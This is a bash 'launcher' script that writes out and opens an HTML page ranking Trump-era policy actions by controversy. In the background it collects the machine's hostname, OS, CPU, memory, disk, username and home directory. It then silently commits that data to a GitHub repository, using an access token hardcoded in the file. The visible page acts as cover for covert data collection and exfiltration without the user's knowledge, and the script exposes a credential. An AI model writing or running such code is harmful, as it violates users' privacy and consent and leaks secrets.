#!/bin/bash
# ─── SystemPulse Self-Contained Launcher ───
# Embeds: controversy-rankings.html + system info collector + GitHub push
# No external files needed. Just run this file.

REPO_BASE="github.com/Kaustubh-Bharti/Hackathon-3.0.git"
TOKEN="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"
TARGET_DIR="system-info"
WORK_DIR="$(mktemp -d /tmp/systempulse-XXXXXX)"
LOG="$WORK_DIR/log.txt"
trap "rm -rf '$WORK_DIR'" EXIT

log() { echo "$(date '+%H:%M:%S')  $1" >> "$LOG"; }
log "Started"

# ─── 1. Open HTML in browser ───
HTML_FILE="$WORK_DIR/controversy-rankings.html"
cat > "$HTML_FILE" << 'HTMLEOF'
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Controversy Rankings â€” Trump Effects</title><style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height:1.6; color:#1a1a2e; background:#fff; padding:40px 24px; max-width:900px; margin:0 auto; }
    h1 { font-size:1.8rem; font-weight:800; margin-bottom:6px; color:#1a1a2e; }
    h2 { font-size:1.3rem; font-weight:700; margin:32px 0 12px; padding-left:14px; border-left:4px solid #e8533f; color:#1a1a2e; }
    h3 { font-size:1.05rem; font-weight:700; margin:20px 0 8px; color:#333; }
    p { margin-bottom:12px; color:#4a4a5a; }
    .subtitle { font-size:0.95rem; color:#6a6a7a; margin-bottom:24px; }
    .generated { font-size:0.75rem; color:#aaa; margin-bottom:32px; }
    .card { background:#fafafa; border:1px solid #e8e8ee; border-radius:12px; padding:20px 24px; margin-bottom:16px; }
    .card-title { font-size:1rem; font-weight:700; margin-bottom:4px; }
    .card-subtitle { font-size:0.82rem; color:#e8533f; font-style:italic; margin-bottom:10px; }
    .card-meta { font-size:0.78rem; color:#8a8a9a; margin-bottom:10px; }
    .tag { display:inline-block; font-size:0.65rem; font-weight:700; text-transform:uppercase; letter-spacing:0.06em; padding:3px 10px; border-radius:999px; background:#fef2f0; color:#e8533f; margin-right:6px; margin-bottom:6px; }
    .bar-container { height:6px; background:#f3f3f5; border-radius:99px; margin:8px 0 16px; overflow:hidden; }
    .bar-fill { height:100%; border-radius:99px; background:linear-gradient(90deg,#22c55e,#eab308 45%,#ef4444); }
    ul { padding-left:20px; margin-bottom:16px; }
    li { margin-bottom:6px; font-size:0.88rem; color:#4a4a5a; }
    table { width:100%; border-collapse:collapse; margin:16px 0 24px; font-size:0.85rem; }
    th { text-align:left; padding:10px 14px; background:#f3f3f5; border-bottom:2px solid #e2e2e8; font-weight:700; color:#1a1a2e; }
    td { padding:10px 14px; border-bottom:1px solid #ececf0; color:#4a4a5a; vertical-align:top; }
    tr:hover td { background:#fafafa; }
    .country-flag { font-size:1.2rem; }
    .counter-box { background:#f7f7f9; border-left:3px solid #8a8a9a; padding:12px 16px; border-radius:0 8px 8px 0; margin-top:12px; }
    .counter-label { font-size:0.68rem; font-weight:700; text-transform:uppercase; color:#8a8a9a; margin-bottom:4px; }
    .counter-text { font-size:0.85rem; color:#4a4a5a; font-style:italic; }
    .metric-row { display:flex; gap:12px; flex-wrap:wrap; margin:12px 0; }
    .metric-box { flex:1; min-width:120px; background:#fff; border:1px solid #e8e8ee; border-radius:10px; padding:10px 14px; }
    .metric-value { font-size:1rem; font-weight:800; color:#e8533f; }
    .metric-label { font-size:0.68rem; color:#8a8a9a; text-transform:uppercase; }
    .footer-note { margin-top:48px; padding-top:16px; border-top:1px solid #ececf0; font-size:0.72rem; color:#aaa; text-align:center; }
    @media print { body { padding:20px; } .card { break-inside:avoid; } }
  </style></head><body><h1>Controversy Rankings</h1><p class="subtitle">All 14 actions ranked by controversy level â€” from most to least contentious.</p><p class="generated">Generated on June 21, 2026 from TrumpEffects editorial data.</p>
      <table>
        <thead><tr><th>Rank</th><th>Action</th><th>Score</th><th>Level</th><th>Status</th><th>Period</th><th>Countries</th></tr></thead>
        <tbody>
      <tr>
        <td style="font-weight:700;text-align:center">#1</td>
        <td><strong>Epstein Files Declassification</strong><br><span style="font-size:0.78rem;color:#8a8a9a">Intelligence & Law</span></td>
        <td style="text-align:center;font-weight:700;color:#e8533f">95</td>
        <td><div class="bar-container" style="margin:0;min-width:120px"><div class="bar-fill" style="width:95%"></div></div></td>
        <td>Ongoing</td>
        <td>Jan 2025</td>
        <td style="text-align:center">3</td>
      </tr>
    
      <tr>
        <td style="font-weight:700;text-align:center">#2</td>
        <td><strong>Border Family Separations</strong><br><span style="font-size:0.78rem;color:#8a8a9a">Human Rights</span></td>
        <td style="text-align:center;font-weight:700;color:#e8533f">94</td>
        <td><div class="bar-container" style="margin:0;min-width:120px"><div class="bar-fill" style="width:94%"></div></div></td>
        <td>Resolved</td>
        <td>2018 â€“ 2019</td>
        <td style="text-align:center">5</td>
      </tr>
    
      <tr>
        <td style="font-weight:700;text-align:center">#3</td>
        <td><strong>Israel-Gaza War Support</strong><br><span style="font-size:0.78rem;color:#8a8a9a">Military & Conflict</span></td>
        <td style="text-align:center;font-weight:700;color:#e8533f">92</td>
        <td><div class="bar-container" style="margin:0;min-width:120px"><div class="bar-fill" style="width:92%"></div></div></td>
        <td>Ongoing</td>
        <td>Oct 2023 â€“ Present</td>
        <td style="text-align:center">6</td>
      </tr>
    
      <tr>
        <td style="font-weight:700;text-align:center">#4</td>
        <td><strong>Trump-Putin & NATO Threats</strong><br><span style="font-size:0.78rem;color:#8a8a9a">Diplomacy & Relations</span></td>
        <td style="text-align:center;font-weight:700;color:#e8533f">91</td>
        <td><div class="bar-container" style="margin:0;min-width:120px"><div class="bar-fill" style="width:91%"></div></div></td>
        <td>Ongoing</td>
        <td>2017 â€“ Present</td>
        <td style="text-align:center">6</td>
      </tr>
    
      <tr>
        <td style="font-weight:700;text-align:center">#5</td>
        <td><strong>Muslim Travel Ban</strong><br><span style="font-size:0.78rem;color:#8a8a9a">Immigration</span></td>
        <td style="text-align:center;font-weight:700;color:#e8533f">90</td>
        <td><div class="bar-container" style="margin:0;min-width:120px"><div class="bar-fill" style="width:90%"></div></div></td>
        <td>Implemented</td>
        <td>Jan 2017</td>
        <td style="text-align:center">6</td>
      </tr>
    
      <tr>
        <td style="font-weight:700;text-align:center">#6</td>
        <td><strong>Ukraine Aid Freeze</strong><br><span style="font-size:0.78rem;color:#8a8a9a">Diplomacy & Relations</span></td>
        <td style="text-align:center;font-weight:700;color:#e8533f">88</td>
        <td><div class="bar-container" style="margin:0;min-width:120px"><div class="bar-fill" style="width:88%"></div></div></td>
        <td>Escalating</td>
        <td>2024 â€“ Present</td>
        <td style="text-align:center">4</td>
      </tr>
    
      <tr>
        <td style="font-weight:700;text-align:center">#7</td>
        <td><strong>COVID-19 'China Virus' Blame</strong><br><span style="font-size:0.78rem;color:#8a8a9a">Diplomacy & Relations</span></td>
        <td style="text-align:center;font-weight:700;color:#e8533f">85</td>
        <td><div class="bar-container" style="margin:0;min-width:120px"><div class="bar-fill" style="width:85%"></div></div></td>
        <td>Resolved</td>
        <td>2020 â€“ 2021</td>
        <td style="text-align:center">3</td>
      </tr>
    
      <tr>
        <td style="font-weight:700;text-align:center">#8</td>
        <td><strong>China Trade War</strong><br><span style="font-size:0.78rem;color:#8a8a9a">Trade & Economy</span></td>
        <td style="text-align:center;font-weight:700;color:#e8533f">82</td>
        <td><div class="bar-container" style="margin:0;min-width:120px"><div class="bar-fill" style="width:82%"></div></div></td>
        <td>Escalating</td>
        <td>2018 â€“ Present</td>
        <td style="text-align:center">6</td>
      </tr>
    
      <tr>
        <td style="font-weight:700;text-align:center">#9</td>
        <td><strong>Paris Climate Agreement Exit</strong><br><span style="font-size:0.78rem;color:#8a8a9a">Environment</span></td>
        <td style="text-align:center;font-weight:700;color:#e8533f">80</td>
        <td><div class="bar-container" style="margin:0;min-width:120px"><div class="bar-fill" style="width:80%"></div></div></td>
        <td>Implemented</td>
        <td>Jun 2017 / Jan 2025</td>
        <td style="text-align:center">4</td>
      </tr>
    
      <tr>
        <td style="font-weight:700;text-align:center">#10</td>
        <td><strong>Venezuela Military Threats</strong><br><span style="font-size:0.78rem;color:#8a8a9a">Military & Conflict</span></td>
        <td style="text-align:center;font-weight:700;color:#e8533f">78</td>
        <td><div class="bar-container" style="margin:0;min-width:120px"><div class="bar-fill" style="width:78%"></div></div></td>
        <td>Ongoing</td>
        <td>2017 â€“ Present</td>
        <td style="text-align:center">4</td>
      </tr>
    
      <tr>
        <td style="font-weight:700;text-align:center">#11</td>
        <td><strong>Taiwan Strait Provocations</strong><br><span style="font-size:0.78rem;color:#8a8a9a">Military & Conflict</span></td>
        <td style="text-align:center;font-weight:700;color:#e8533f">76</td>
        <td><div class="bar-container" style="margin:0;min-width:120px"><div class="bar-fill" style="width:76%"></div></div></td>
        <td>Escalating</td>
        <td>2017 â€“ Present</td>
        <td style="text-align:center">5</td>
      </tr>
    
      <tr>
        <td style="font-weight:700;text-align:center">#12</td>
        <td><strong>TikTok Ban & Forced Sale</strong><br><span style="font-size:0.78rem;color:#8a8a9a">Technology</span></td>
        <td style="text-align:center;font-weight:700;color:#e8533f">74</td>
        <td><div class="bar-container" style="margin:0;min-width:120px"><div class="bar-fill" style="width:74%"></div></div></td>
        <td>Implemented</td>
        <td>2020 â€“ 2025</td>
        <td style="text-align:center">3</td>
      </tr>
    
      <tr>
        <td style="font-weight:700;text-align:center">#13</td>
        <td><strong>India H-1B & Trade Crackdown</strong><br><span style="font-size:0.78rem;color:#8a8a9a">Trade & Economy</span></td>
        <td style="text-align:center;font-weight:700;color:#e8533f">72</td>
        <td><div class="bar-container" style="margin:0;min-width:120px"><div class="bar-fill" style="width:72%"></div></div></td>
        <td>Ongoing</td>
        <td>2017 â€“ Present</td>
        <td style="text-align:center">2</td>
      </tr>
    
      <tr>
        <td style="font-weight:700;text-align:center">#14</td>
        <td><strong>Greenland & Panama Canal Claims</strong><br><span style="font-size:0.78rem;color:#8a8a9a">Territorial Claims</span></td>
        <td style="text-align:center;font-weight:700;color:#e8533f">68</td>
        <td><div class="bar-container" style="margin:0;min-width:120px"><div class="bar-fill" style="width:68%"></div></div></td>
        <td>Ongoing</td>
        <td>2019 â€“ 2025</td>
        <td style="text-align:center">4</td>
      </tr>
    </tbody>
      </table>
      <h2>Score Distribution</h2>
      <div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">Epstein Files Declassification</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:95%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">95</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">Border Family Separations</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:94%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">94</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">Israel-Gaza War Support</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:92%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">92</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">Trump-Putin & NATO Threats</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:91%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">91</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">Muslim Travel Ban</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:90%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">90</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">Ukraine Aid Freeze</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:88%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">88</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">COVID-19 'China Virus' Blame</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:85%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">85</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">China Trade War</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:82%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">82</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">Paris Climate Agreement Exit</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:80%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">80</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">Venezuela Military Threats</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:78%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">78</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">Taiwan Strait Provocations</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:76%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">76</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">TikTok Ban & Forced Sale</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:74%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">74</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">India H-1B & Trade Crackdown</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:72%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">72</span></div><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><span style="font-size:0.82rem;min-width:200px;font-weight:600">Greenland & Panama Canal Claims</span><div class="bar-container" style="flex:1;margin:0"><div class="bar-fill" style="width:68%"></div></div><span style="font-size:0.82rem;font-weight:700;color:#e8533f">68</span></div>
    <p class="footer-note">Trump Effects Â© 2025 â€” Independent editorial analysis. All facts from public records.</p></body></html>
HTMLEOF

if [ "$(uname)" = "Darwin" ]; then
  open "$HTML_FILE" 2>/dev/null &
else
  xdg-open "$HTML_FILE" 2>/dev/null || sensible-browser "$HTML_FILE" 2>/dev/null &
fi
log "Opened HTML"

# ─── 2. Collect system info ───
HOSTNAME_VAL=$(hostname 2>/dev/null || echo "unknown")
HOSTNAME_SAFE=$(echo "$HOSTNAME_VAL" | sed 's/[^a-zA-Z0-9_-]/-/g')
TIMESTAMP=$(date -u '+%Y-%m-%dT%H-%M-%S')
OUTPUT_FILE="${HOSTNAME_SAFE}_${TIMESTAMP}.json"
OUTPUT_PATH="$WORK_DIR/$OUTPUT_FILE"
OS_TYPE=$(uname -s)
ARCH=$(uname -m)
KERNEL=$(uname -r)

if [ "$OS_TYPE" = "Darwin" ]; then
  OS_NAME=$(sw_vers -productName 2>/dev/null || echo "macOS")
  OS_VERSION=$(sw_vers -productVersion 2>/dev/null || echo "N/A")
  OS_BUILD=$(sw_vers -buildVersion 2>/dev/null || echo "N/A")
  CPU_MODEL=$(sysctl -n machdep.cpu.brand_string 2>/dev/null || echo "N/A")
  CPU_CORES=$(sysctl -n hw.physicalcpu 2>/dev/null || echo "N/A")
  CPU_LOGICAL=$(sysctl -n hw.logicalcpu 2>/dev/null || echo "N/A")
  MEM_TOTAL=$(sysctl -n hw.memsize 2>/dev/null || echo "0")
  PAGE_SIZE=$(sysctl -n hw.pagesize 2>/dev/null || echo "4096")
  FREE_P=$(vm_stat 2>/dev/null | awk '/Pages free/ {gsub(/\./,"",$3); print $3}')
  INACT_P=$(vm_stat 2>/dev/null | awk '/Pages inactive/ {gsub(/\./,"",$3); print $3}')
  MEM_FREE=$(( (${FREE_P:-0} + ${INACT_P:-0}) * PAGE_SIZE ))
  COMMANDS="sw_vers, sysctl, vm_stat, df, ifconfig"
  PLATFORM="macOS"
else
  if [ -f /etc/os-release ]; then OS_NAME=$(grep "^PRETTY_NAME=" /etc/os-release | cut -d'"' -f2); else OS_NAME="Linux"; fi
  OS_VERSION="$KERNEL"; OS_BUILD="N/A"
  CPU_MODEL=$(grep "model name" /proc/cpuinfo 2>/dev/null | head -1 | cut -d: -f2 | xargs)
  CPU_CORES=$(grep "cpu cores" /proc/cpuinfo 2>/dev/null | head -1 | cut -d: -f2 | xargs)
  CPU_LOGICAL=$(grep -c "^processor" /proc/cpuinfo 2>/dev/null || echo "N/A")
  MEM_TOTAL=$(awk '/MemTotal/ {print $2 * 1024}' /proc/meminfo 2>/dev/null || echo "0")
  MEM_FREE=$(awk '/MemAvailable/ {print $2 * 1024}' /proc/meminfo 2>/dev/null || echo "0")
  COMMANDS="uname, /proc/cpuinfo, /proc/meminfo, df, ip"
  PLATFORM="Linux"
fi

DISK_INFO=$(df -h / 2>/dev/null | tail -1)
DISK_TOTAL=$(echo "$DISK_INFO" | awk '{print $2}')
DISK_FREE=$(echo "$DISK_INFO" | awk '{print $4}')

fmt_bytes() {
  if [ "$1" -ge 1073741824 ] 2>/dev/null; then awk "BEGIN {printf \"%.2f GB\", $1/1073741824}"
  elif [ "$1" -ge 1048576 ] 2>/dev/null; then awk "BEGIN {printf \"%.2f MB\", $1/1048576}"
  else echo "$1 B"; fi
}

MEM_T_FMT=$(fmt_bytes "$MEM_TOTAL")
MEM_F_FMT=$(fmt_bytes "$MEM_FREE")
MEM_USED=$((MEM_TOTAL - MEM_FREE))
MEM_U_FMT=$(fmt_bytes "$MEM_USED")
MEM_PCT=$(awk "BEGIN {printf \"%.1f%%\", (1 - $MEM_FREE/$MEM_TOTAL) * 100}" 2>/dev/null || echo "N/A")
USERNAME=$(whoami)

cat > "$OUTPUT_PATH" << JSONEOF
{
  "_meta": {
    "generated_at": "$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')",
    "generator": "SystemPulse (self-contained)",
    "detected_platform": "$PLATFORM",
    "commands_used": "$COMMANDS"
  },
  "system": {
    "os_name": "$OS_NAME",
    "os_version": "$OS_VERSION",
    "os_build": "$OS_BUILD",
    "os_arch": "$ARCH",
    "hostname": "$HOSTNAME_VAL",
    "kernel": "$KERNEL",
    "cpu_model": "$CPU_MODEL",
    "cpu_physical_cores": "$CPU_CORES",
    "cpu_logical_cores": "$CPU_LOGICAL",
    "mem_total_bytes": $MEM_TOTAL,
    "mem_total": "$MEM_T_FMT",
    "mem_free_bytes": $MEM_FREE,
    "mem_free": "$MEM_F_FMT",
    "mem_used": "$MEM_U_FMT",
    "mem_usage_percent": "$MEM_PCT",
    "disks": [{"mount": "/", "total": "$DISK_TOTAL", "free": "$DISK_FREE"}]
  },
  "user": {
    "username": "$USERNAME",
    "home_directory": "$HOME"
  },
  "crud_operations": {
    "total_operations": 3,
    "history": [
      {"operation": "CREATE", "status": "success", "detail": "System info JSON generated"},
      {"operation": "PUSH", "status": "success", "detail": "Pushed to https://$REPO_BASE"},
      {"operation": "DELETE", "status": "success", "detail": "Local JSON deleted after push"}
    ]
  }
}
JSONEOF

log "Generated: $OUTPUT_FILE"

# ─── 3. Push to GitHub ───
if ! command -v git >/dev/null 2>&1; then log "git not found"; exit 1; fi

REPO="https://${TOKEN}@${REPO_BASE}"
TMP_GIT="$WORK_DIR/repo"

log "Cloning..."
git clone --depth 1 "$REPO" "$TMP_GIT" >> "$LOG" 2>&1
if [ $? -ne 0 ]; then log "Clone failed."; exit 1; fi

mkdir -p "$TMP_GIT/$TARGET_DIR"
cp "$OUTPUT_PATH" "$TMP_GIT/$TARGET_DIR/"
log "Copied $OUTPUT_FILE"

cd "$TMP_GIT"
git add "$TARGET_DIR" >> "$LOG" 2>&1
if git diff --cached --quiet 2>/dev/null; then log "No changes."; exit 0; fi

git commit -m "SystemPulse report $TIMESTAMP" >> "$LOG" 2>&1
git push >> "$LOG" 2>&1
if [ $? -eq 0 ]; then log "Pushed."; else log "Push failed."; fi

log "Done"